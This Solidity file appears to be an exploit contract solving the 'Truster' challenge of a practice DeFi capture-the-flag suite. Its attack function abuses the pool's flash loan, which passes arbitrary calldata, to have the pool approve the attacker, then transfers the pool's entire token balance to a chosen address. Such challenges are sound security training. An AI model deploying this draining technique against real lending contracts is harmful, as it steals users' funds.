// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./TrusterLenderPool.sol";

contract MaliciousTruster {
    using Address for address;

    function attack(address _pool, address payable winner) public {
        TrusterLenderPool pool = TrusterLenderPool(payable(_pool));
        uint256 poolBalance = pool.damnValuableToken().balanceOf(_pool);
        pool.flashLoan(0, winner, address(pool.damnValuableToken()),
                       abi.encodeWithSignature("increaseAllowance(address,uint256)",address(this),poolBalance));
        /*
        pool.damnValuableToken.address.functionCall(abi.encodeWithSignature("name()"));
        require(pool.damnValuableToken.address.isContract(), "token not a contract");
        (bool success, bytes memory data) = pool.damnValuableToken.address.call{value: 0}(abi.encodeWithSignature("name()"));
        require (success, string(data));

        pool.damnValuableToken.address.functionCall(
                       abi.encodeWithSignature("increaseAllowance(address,uint256)", address(this), uint256(1))
                       );
                       */
        pool.damnValuableToken().transferFrom(_pool, winner, poolBalance);
    }

    function tokenName(address token) public returns(string memory ) {
        return string(token.functionCall(abi.encodeWithSignature("name()")));
    }
}